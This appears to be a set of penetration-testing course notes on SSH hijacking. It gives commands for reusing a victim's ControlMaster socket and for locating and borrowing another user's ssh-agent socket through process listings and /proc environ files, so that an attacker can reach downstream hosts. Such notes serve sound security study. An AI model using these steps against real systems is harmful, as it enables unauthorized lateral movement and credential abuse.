# SSH Hijacking



The term SSH hijacking refers to the use of an existing SSH connection to gain access to another machine. Two of the most common methods of SSH hijacking use the _ControlMaster_ feature or the _ssh-agent_.

## ControlMaster

ControlMaster is a feature that enables sharing of multiple SSH sessions over a single network connection. This functionality can be enabled for a given user by editing their local SSH configuration file (\~/.ssh/config). If a user is connecting then connecting to a downstream server we can hijack that connection.&#x20;

{% code overflow="wrap" %}
```bash
# Create ~/.ssh/config 
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m
# Change file permissions
chmod 644 ~/.ssh/config
# Creating the controlmaster socket directory
mkdir ~/.ssh/controlmaster
# Once victim has created connection check for a ControlMaster socket
ls -al ~/.ssh/controlmaster/
# We can then connect as the user to the downstream server (Must be logged into users session)
ssh victim@downstream
# If running as root
ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 victim@downstream
```
{% endcode %}

## SSH-Agent

SSH Public key is needed on both the intermediate and victim servers. A user can then connect to both without being prompted for credentials.&#x20;

{% code overflow="wrap" %}
```bash
# Copy public key to both intermediate and victim servers. 
ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller
ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@linuxvictim
# In /etc/ssh/sshd_config ensure below setting is set on Kali host. 
AllowAgentForwarding yes
# Allowing agent forwarding on intermediate server
AllowAgentForwarding yes
# Running SSH-Agent manually on Kali host
eval `ssh-agent`
# Running ssh-add on Kali host
ssh-add
# We can then ssh to both intermediate and victum without being prompted for credentials
ssh offsec@controller
ssh offsec@linuxvictim
# If a user has an active SSH connection to the intermediate server and we have SSH-Agent forwarding enabled we can connect to any downstream server we like. 
ssh offsec@linuxvictim
# If we have a root account on the intermediate server then we can hijack an open socket. 
# Finding user SSH connections via ps
ps aux | grep ssh
# Finding PIDs using pstree
pstree -p offsec | grep ssh
# SSH process environment file
cat /proc/16381/environ
# Using the victim's SSH agent socket as our own
SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh offsec@linuxvictim
```
{% endcode %}
